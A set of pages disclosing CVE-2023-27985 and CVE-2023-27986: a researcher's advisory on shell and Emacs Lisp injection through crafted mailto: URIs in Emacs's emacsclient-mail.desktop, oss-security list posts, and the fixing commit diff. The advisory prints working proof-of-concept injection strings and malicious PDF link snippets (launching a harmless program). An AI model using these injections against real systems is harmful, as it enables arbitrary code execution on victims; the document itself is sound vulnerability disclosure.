=== Content from www.gabriel.urdhr.fr_cb54c652_20250114_230206.html ===
  [/dev/posts/](/)

* [Home](/)
* [Tags](/tags/)
* [Archives](/archives/)
* [Vulnerabilities](/vulnerabilities/)
* [Code](https://github.com/randomstuff)
* Configuration
  [нет войне](https://github.com/RSF-RWB/collateralfreedom) [Слава Україні](https://stand-with-ukraine.pp.ua/)
# Shell command and Emacs Lisp injection in emacsclient-mail.desktop

Published: Jun 8 2023

Updated: Jun 8 2023

 Comment   Like   Dislike   Other reaction   Share

[computer](/tags/computer/) [security](/tags/security/) [emacs](/tags/emacs/) [shell](/tags/shell/) [unix](/tags/unix/) [freedesktop](/tags/freedesktop/)

[CVE-2023-27986](https://nvd.nist.gov/vuln/detail/CVE-2023-27986) [CVE-2023-27985](https://nvd.nist.gov/vuln/detail/CVE-2023-27985)

Shell command injection and Emacs Lisp injection vulnerabilities in one of the Emacs Desktop Entry (emacsclient-mail.desktop) leading to arbitrary code execution through a crafted `mailto:` URI.

One of the Emacs [Desktop Entry](https://specifications.freedesktop.org/desktop-entry-spec/desktop-entry-spec-latest.html) (`emacsclient-mail.desktop`) is vulnerable to [shell command injection](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-shell-injection.ogv) and [Emacs Lisp injection](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-lisp-injection.ogv) through a crafted `mailto:` URI. This can for example be exploited by a remote attacker through a hyperlink in a malicious PDF (as demonstrated using Evince and Okular). This can be used to **execute arbitrary code** on the user's behalf.

| Vulnerability | CVE | Affected | Fixed in |
| --- | --- | --- | --- |
| Shell command injection through emacsclient-mail.desktop | [CVE-2023-27985](https://nvd.nist.gov/vuln/detail/CVE-2023-27985) | 28.1 to 28.x | 29.0.90 |
| Emacs Lisp injection through emacsclient-mail.desktop | [CVE-2023-27986](https://nvd.nist.gov/vuln/detail/CVE-2023-27986) | 28.1 to 28.x | 29.0.90 |

## Shell command injection

The Desktop entry (`emacsclient-mail.desktop`) is as follows:

```
[Desktop Entry]
Categories=Network;Email;
Comment=GNU Emacs is an extensible, customizable text editor - and more
Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\\\(message-mailto\\\\ \\\\\\"%u\\\\\\"\\\\)"
Icon=emacs
Name=Emacs (Mail, Client)
MimeType=x-scheme-handler/mailto;
NoDisplay=true
Terminal=false
Type=Application
Keywords=emacsclient;
Actions=new-window;new-instance;

# ...

```

The `Exec` stanza is vulnerable to injection of shell commands and Emacs Lisp code.

The shell command injection may be demonstrated on KDE with the following command:

```
kde-open "mailto:foo@example.com:\$(xterm -e nyancat)"

```

This executes the following shell command:

```
exec emacsclient --alternate-editor= --display="$DISPLAY" --eval \(message-mailto\ \"mailto:foo@example.com:$(xterm -e nyancat)\"\)

```

which in turns executes:

```
xterm -e nyancat

```

This may for example be [triggered from Okular](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-shell-injection.ogv) under KDE (i.e., through `kde-open`). Clicking on a malicious URI contained in a malicious PDF results in the execution of the embedded shell command:

```
XDG_CURRENT_DESKTOP=KDE KDE_SESSION_VERSION=4 okular test.pdf
XDG_CURRENT_DESKTOP=KDE KDE_SESSION_VERSION=4 xdg-open "mailto:foo@example.com:\$(xterm -e nyancat)"

```

With a PDF containing such a snippet:

```
4 0 obj
<</Type/Annot/Subtype/Link/Border[0 0 0]/Rect[56 772.4 77.3 785.1]/A<</Type/Action/S/URI/URI(mailto:foo@example.com:\$(xterm -e nyancat))>>
endobj

```

This has been introduced by [commit b1b05c82](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=b1b05c828d67930bb3b897fe98e1992db42cf23c). This has beed fixed in [commit d3209119](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467) as part of [Emacs Bug #60204](https://debbugs.gnu.org/cgi/bugreport.cgi?bug=60204) (though the security impact of this bug was not noticed at this point):

```
Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u

```

This vulnerability has been observed with:

* Debian Testing;
* GNU Emacs 28.2;
* xdg-utils (xdg-ooen) 1.1.3-4.1;
* KDE Plasma Desktop (5.27.0-1);
* Okular 22.12.1
* `kde-open` 4:5.27.0-1

## Emacs Lisp injection

This patch fixes the shell command injection. However, it is still vulnerable to Emacs Lisp injection resulting to arbitrary code execution.

The new `Exec` stanza in the desktop entry is:

```
Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u

```

Any of these commands demonstrate Emacs Lisp injection and trigger the execution of an external program:

```
gio open 'mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")"'
XDG_CURRENT_DESKTOP=GNOME3 xdg-open 'mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")")'

```

This executes the following shell command:

```
sh -c "exec emacsclient --alternate-editor= --display=\"$DISPLAY\" --eval \"(message-mailto \\\"$1\\\")\"" \
  sh 'mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")"'

```

This executes the following Lisp code:

```
(message-mailto "mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")"")

```

which triggers a shell command:

```
xterm -e nyancat

```

Note: evaluation of the inner code

For some reason on some installations, the inner code (`shell-command-to-string`) is not evaluated apparently because the number of arguments for `message-mailto`  is not correct: `(wrong-number-of-arguments message-mailto 3)`.

While this works:

```
(message-mailto (shell-command-to-string"xterm -e nyancat"))

```

This does not work:

```
(message-mailto "mailto:foo@example.com" (shell-command-to-string"xterm -e nyancat"))

```

I don't know why this happens.

This can be [triggered from Evince](https://www.gabriel.urdhr.fr/videos/emacsclient-mail-lisp-injection.ogv) under GNOME (i.e. through `gio open`):

```
XDG_CURRENT_DESKTOP=GNOME3 evince test.pdf

```

With a PDF containing such a snippet:

```
4 0 obj
<</Type/Annot/Subtype/Link/Border[0 0 0]/Rect[56 772.4 77.3 785.1]/A<</Type/Action/S/URI/URI(mailto:foo@example.com"(shell-command-to-string"xterm -e nyancat")")>>
>>
endobj

```

This is fixed in [commit 3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc):

```
# We want to pass the following commands to the shell wrapper:
# u=${1//\\/\\\\}; u=${u//\"/\\\"}; exec emacsclient --alternate-editor= --display="$DISPLAY" --eval "(message-mailto \"$u\")"
# Special chars '"', '$', and '\' must be escaped as '\\"', '\\$', and '\\\\'.
Exec=bash -c "u=\\${1//\\\\\\\\/\\\\\\\\\\\\\\\\}; u=\\${u//\\\\\\"/\\\\\\\\\\\\\\"}; exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$u\\\\\\")\\"" bash %u

```

This fix was later modified in [commit c8ec0017](http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=c8ec0017cb96d4ac98be21e1fe9a95e1aa723e99) in order to [avoid depending on bash](https://lists.gnu.org/archive/html/emacs-devel/2023-03/msg00227.html):

```
Exec=sh -c "u=\\$(echo \\"\\$1\\" | sed 's/[\\\\\\"]/\\\\\\\\&/g'); exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$u\\\\\\")\\"" sh %u

```

This vulnerability has been observed with:

* Debian Testing;
* GNU Emacs 28.2;
* xdg-utils (xdg-open) 1.1.3-4.1;
* GNOME 4.0-1;
* Evince 43.1-2+b1
* `gio open` 2.74.5-1

## Conclusion

It is interesting that in this case, the vulnerablity was introduced by the Desktop Entry file. The security impact of such files may easily be overlooked.

## Timeline

* 2023-03-02, Reported to maintainers
* 2023-03-02, Confirmation by maintainers
* 2023-03-07/08, Development of mitigations
* 2023-03-08, Disclosure
* 2023-03-08, CVEs assigned by MITRE
* 2023-04-10, Emacs 29.0.90 pretest is available containing the fix

## References

* [Emacs Bug #60204 ~ Invalid Exec key in etc/emacsclient-mail.desktop](https://debbugs.gnu.org/cgi/bugreport.cgi?bug=60204)
* [CVE-2023-27985](https://nvd.nist.gov/vuln/detail/CVE-2023-27985)
* [CVE-2023-27986](https://nvd.nist.gov/vuln/detail/CVE-2023-27986)
* [emacs-devel mailing-list thread about this](https://lists.gnu.org/archive/html/emacs-devel/2023-03/threads.html#00227)

## Appendix, some notes about file and URI handlers

You can modify the default Desktop entry used for a given URI scheme (or MIME type) by editing `~/.config/mimeapps.list`.

The following commands may be used to invoke programs to handle files and/or URIs:

* `xdg-open` is script which delegates to several of the other programs mentionned here depending on the desktop environment,
* `kde-open` and `kde-open5` are used under KDE;
* `kfmclient exec` is used under old versions of KDE;
* `dde-open` is used under [Deepin](https://www.deepin.org/);
* `enlightenment_open` is used under Enlightenment;
* `gio open` is used under GNOME;
* `gvfs-open` is used under GNOME as well;
* `gnome-open` is used under GNOME as well;
* `exo-open` is used under XFCE;
* `mimeopen` is a Perl utility;
* `dex` is a utility for Desktop entries.
       Search on this site   Search

 [About](/about/) - [Mentions légales](/legal/)



=== Content from www.openwall.com_0c1e0f3a_20250114_230205.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](../../../2023/03/08/3) [[next>]](2) [[<thread-prev]](../../../2023/03/08/2) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <ZAmHgoA8GvuVpS2V@eldamar.lan>
Date: Thu, 9 Mar 2023 08:15:14 +0100
From: Salvatore Bonaccorso <carnil@...ian.org>
To: oss-security@...ts.openwall.com
Subject: Re: Shell command and Emacs Lisp code injection in
 emacsclient-mail.desktop

Hi,

On Wed, Mar 08, 2023 at 12:37:29PM +0100, Gabriel Corona wrote:
> emacsclient-mail.desktop is vulnerable to shell command
> injections and Emacs Lisp injections through a crafted
> mailto: URI.

Two CVEs are assigned by MITRE:

>
> This has been introduced in Emacs 28.1:
>
> <http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=b1b05c828d67930bb3b897fe98e1992db42cf23c>
>
> A fix for shell command injection is currently included
> in the upcoming 28.3 branch:
>
> <http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467>

CVE-2023-27985

>
> A fix for both is currently included in the upcoming 29.1 branch:
>
> <http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc>

CVE-2023-27986

Regards,
Salvatore

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from git.savannah.gnu.org_d84cb50c_20250114_230204.html ===


| [cgit logo](/cgit/) | [index](/cgit/) : [emacs.git](/cgit/emacs.git/ "emacs.git") | bugfix/shorthand-fixes comment-cache concurrency-libtask dima\_regex\_embedded\_modifiers elparized-core emacs-23 emacs-24 emacs-25 emacs-26 emacs-27 emacs-28 emacs-29 emacs-30 feature/android feature/asan-gc-poisoning feature/auth-source-pass feature/breadcrumb-mode feature/byte-switch feature/byte-tail-recursion feature/byte-unwind-protect feature/cl-lib-improvements feature/comp-use-ctors feature/completion-lazy-hilit feature/completions-highlight-modifications feature/core-elpa-by-copy feature/deps-download feature/dll-only-windows feature/elpa-package feature/etags-update feature/etags\_update\_v2 feature/extend\_face\_id feature/external-completion feature/gnus-select feature/gnus-select2 feature/icomplete-vertical feature/inhibit-native-comp-cleanup feature/integrated-elpa feature/integration-of-dictionary-el feature/internal-msys feature/jit-improved-type-punning feature/jsonrpc-support-dap feature/libjit feature/mhtml-mode feature/minibuffer-completion-enhancements feature/more-fds feature/named-lambdas feature/new-tutorial feature/package+vc feature/package-autosuggest feature/parsable-ert-output feature/pgtk feature/positioned-lambdas feature/shorthand-namespacing feature/simple-16-theme feature/smaller-windows feature/soc-bytecode-in-traceback feature/soc-bytecode-in-traceback-reduced feature/stdout-stderr-stream feature/temacs-for-bootstrap feature/tramp-thread-safe feature/tree-sitter feature/type-hierarchy feature/windows-with-utils feature/xref-find-extra feature/zach-soc-bytecode-in-traceback feature/zach-soc-funcall-from-bytecode fix/bootstrap-build-minimize fix/bootstrap-build-minimize-squash fix/bug-2034 fix/bug-20871 fix/bug-35351 fix/bug-60974 fix/eieio-persistent fix/great-revert-bill fix/htmlfontify-21990 fix/not-defined-at-runtime girzel/gnus-headers gnus/nnatom master nick.lloyd-bytecode-jit old-branches/EMACS\_21\_1\_RC old-branches/EMACS\_22\_BASE old-branches/EMACS\_23\_1\_RC old-branches/NewVC-fileset old-branches/cairo old-branches/cedet-branch old-branches/concurrency old-branches/dynamic-modules-rc2 old-branches/emacs-unicode old-branches/emacs-unicode-2 old-branches/font-backend old-branches/gnus-5\_10-branch old-branches/lexbind old-branches/multi-tty old-branches/pending old-branches/profiler old-branches/python old-branches/rmail-mbox-branch old-branches/unicode-xft old-branches/window-pub other-branches/Boehm-GC other-branches/Boehm-versions other-branches/DAVELOVE other-branches/FLYSPELL other-branches/ILYA other-branches/VENDOR other-branches/fx-branch other-branches/gerd\_0001 other-branches/gerd\_dbe other-branches/old-bidi other-branches/old-concurrency other-branches/patches\_21\_0 other-branches/test2 other-branches/ttn-vms-21-2-stash other-branches/ttn-vms-21-3-stash pdumper scratch/a-modest-completion-redesign-proposal scratch/accurate-warning-pos scratch/add-jsonrpc scratch/add-lisp-data-mode scratch/albinus scratch/alloc scratch/allow-custom-load-paths-in-elisp-flymake scratch/allow-custom-null-and-false-objects-in-jsonc scratch/annotation-function-improvements scratch/api.el scratch/backend-completion scratch/benchmarks scratch/bug#48029 scratch/bug-42149-funny-pcm-completion-scores scratch/bug-50244 scratch/bug-50959-fix scratch/build-test scratch/bulk-tracing scratch/comp-branch-optim scratch/comp-static-data scratch/completion-api scratch/correct-warning-pos scratch/customize-quotes scratch/dbusbind-type scratch/dbusbind-type-tests scratch/eldoc-async scratch/eldoc-display-functions scratch/eldoc-eglot-rework scratch/eldoc-xref-project-gnu-elpa-core-packages scratch/electric-pair-cleanup-and-49518-bugfix scratch/elisp-benchmarks scratch/emacs-30-ts-query-patch scratch/emacs-editorconfig scratch/erc-oldies scratch/etags-regen scratch/eudc-bbdb-3 scratch/fcr scratch/fido-mode scratch/fix-40529-tabulated-list-mode-bootstrapping scratch/fix-snapshot-building scratch/flymake-augment-api scratch/flymake-fancy-end-of-line scratch/flymake-refactor-cleaner-for-emacs-26 scratch/follow scratch/font\_lock\_large\_files scratch/fontify-open-string scratch/func-type-decls scratch/gl-state-bytepos scratch/gnus-decoded scratch/gnus-docs scratch/gnus-hashtables scratch/gnus-roadmap scratch/gnus-search scratch/handler-bind-2 scratch/hard-narrow scratch/highlight-n-windows scratch/icomplete-lazy-highlight-attempt-2 scratch/icomplete-lazy-highlight-no-string-props scratch/icomplete-vertical-mode-gregory-and-joao scratch/icomplete-vertical-mode-improvements scratch/icons scratch/igc scratch/interpreted-function scratch/isearch-show-toggles scratch/joaot/make-completion-at-point-function scratch/kqueue scratch/last-cedet-merge scratch/lexspaces scratch/markers-as-gap-array scratch/merge-cedet-tests scratch/modern-mode scratch/multi-level-test-makefile scratch/native-timers-blocked scratch/new-flex-completion-style scratch/no-ls-lisp-advice scratch/no-purespace scratch/nonspecial-handlers scratch/np/backports-26.2 scratch/ns/emacs27-drawing scratch/octave-eldoc-fixes scratch/package-security scratch/pkg scratch/posix-spawn scratch/pure-overflow-warn scratch/python-eldoc-async scratch/raeburn-startup scratch/resolve-cc-mode-and-e-p-m scratch/reworked-icomplete-in-buffer-mode scratch/seccomp scratch/shorthand-namespacing scratch/some-more-icomplete-hacks scratch/support-plists-in-jsonc scratch/support-plists-in-jsonc-autodetect scratch/tango-icons scratch/timsort scratch/tsdh-vc-list-files scratch/tty-child-frames scratch/tzz/auth-source-reveal-mode scratch/tzz/cicd scratch/tzz/gnus-cloud-aead scratch/tzz/import-pl scratch/tzz/prettify-text-mode scratch/windows-98 scratch/windows-branch-build-2 scratch/with-fetched-url scratch/write-eglot-manual-for-advanced-server-config stream test-concurrency wallet xwidget xwidget\_mvp |
| --- | --- | --- |
| Emacs source repository |  |

| [summary](/cgit/emacs.git/?h=emacs-29)[refs](/cgit/emacs.git/refs/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc)[log](/cgit/emacs.git/log/?h=emacs-29)[tree](/cgit/emacs.git/tree/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc)[commit](/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc)[diff](/cgit/emacs.git/diff/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Ulrich Müller <ulm@gentoo.org> | 2023-03-07 18:25:37 +0100 |
| --- | --- | --- |
| committer | Ulrich Müller <ulm@gentoo.org> | 2023-03-07 18:25:37 +0100 |
| commit | [3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc](/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc) ([patch](/cgit/emacs.git/patch/?id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc)) | |
| tree | [f4d2798e2e502999a8c06062bdda0f8498fa6afa](/cgit/emacs.git/tree/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc) | |
| parent | [ab417c8a6eeb7df7ccce3e5f8416f48544a5174e](/cgit/emacs.git/commit/?h=emacs-29&id=ab417c8a6eeb7df7ccce3e5f8416f48544a5174e) ([diff](/cgit/emacs.git/diff/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc&id2=ab417c8a6eeb7df7ccce3e5f8416f48544a5174e)) | |
| download | [emacs-3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc.tar.gz](/cgit/emacs.git/snapshot/emacs-3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc.tar.gz) | |

Fix Elisp code injection vulnerability in emacsclient-mail.desktopA crafted mailto URI could contain unescaped double-quote
characters, allowing injection of Elisp code. Therefore, any
'\' and '"' characters are replaced by '\\' and '\"', using Bash
pattern substitution (which is not available in the POSIX shell).
We want to pass literal 'u=${1//\\/\\\\}; u=${u//\"/\\\"};' in the
bash -c command, but in the desktop entry '"', '$', and '\' must
be escaped as '\\"', '\\$', and '\\\\', respectively (backslashes
are expanded twice, see the Desktop Entry Specification).
Reported by Gabriel Corona <gabriel.corona@free.fr>.
\* etc/emacsclient-mail.desktop (Exec): Escape backslash and
double-quote characters.
[Diffstat](/cgit/emacs.git/diff/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc)

| -rw-r--r-- | [etc/emacsclient-mail.desktop](/cgit/emacs.git/diff/etc/emacsclient-mail.desktop?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc) | 7 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 5 insertions, 2 deletions

| diff --git a/etc/emacsclient-mail.desktop b/etc/emacsclient-mail.desktopindex 91df122..49c6f99 100644--- a/[etc/emacsclient-mail.desktop](/cgit/emacs.git/tree/etc/emacsclient-mail.desktop?h=emacs-29&id=ab417c8a6eeb7df7ccce3e5f8416f48544a5174e)+++ b/[etc/emacsclient-mail.desktop](/cgit/emacs.git/tree/etc/emacsclient-mail.desktop?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc)@@ -1,7 +1,10 @@ [Desktop Entry] Categories=Network;Email; Comment=GNU Emacs is an extensible, customizable text editor - and more-Exec=sh -c "exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u+# We want to pass the following commands to the shell wrapper:+# u=${1//\\/\\\\}; u=${u//\"/\\\"}; exec emacsclient --alternate-editor= --display="$DISPLAY" --eval "(message-mailto \"$u\")"+# Special chars '"', '$', and '\' must be escaped as '\\"', '\\$', and '\\\\'.+Exec=bash -c "u=\\${1//\\\\\\\\/\\\\\\\\\\\\\\\\}; u=\\${u//\\\\\\"/\\\\\\\\\\\\\\"}; exec emacsclient --alternate-editor= --display=\\"\\$DISPLAY\\" --eval \\"(message-mailto \\\\\\"\\$u\\\\\\")\\"" bash %u Icon=emacs Name=Emacs (Mail, Client) MimeType=x-scheme-handler/mailto;@@ -13,7 +16,7 @@ Actions=new-window;new-instance;  [Desktop Action new-window] Name=New Window-Exec=sh -c "exec emacsclient --alternate-editor= --create-frame --eval \\"(message-mailto \\\\\\"\\$1\\\\\\")\\"" sh %u+Exec=bash -c "u=\\${1//\\\\\\\\/\\\\\\\\\\\\\\\\}; u=\\${u//\\\\\\"/\\\\\\\\\\\\\\"}; exec emacsclient --alternate-editor= --create-frame --eval \\"(message-mailto \\\\\\"\\$u\\\\\\")\\"" bash %u  [Desktop Action new-instance] Name=New Instance |
| --- |

generated by [cgit v1.1](https://git.zx2c4.com/cgit/about/) at 2025-01-14 23:02:04 +0000



=== Content from www.openwall.com_d2277649_20250114_230206.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](../../../2023/03/09/1) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <80616781-a635-02a0-2aa3-a8afc60e6c4c@free.fr>
Date: Wed, 8 Mar 2023 12:37:29 +0100
From: Gabriel Corona <gabriel.corona@...e.fr>
To: oss-security@...ts.openwall.com
Subject: Shell command and Emacs Lisp code injection in
 emacsclient-mail.desktop

emacsclient-mail.desktop is vulnerable to shell command
injections and Emacs Lisp injections through a crafted
mailto: URI.

This has been introduced in Emacs 28.1:

<http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=b1b05c828d67930bb3b897fe98e1992db42cf23c>

A fix for shell command injection is currently included
in the upcoming 28.3 branch:

<http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=d32091199ae5de590a83f1542a01d75fba000467>

A fix for both is currently included in the upcoming 29.1 branch:

<http://git.savannah.gnu.org/cgit/emacs.git/commit/?h=emacs-29&id=3c1693d08b0a71d40a77e7b40c0ebc42dca2d2cc>

Download attachment "[OpenPGP_signature](2/1)" of type "application/pgp-signature" (841 bytes)

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


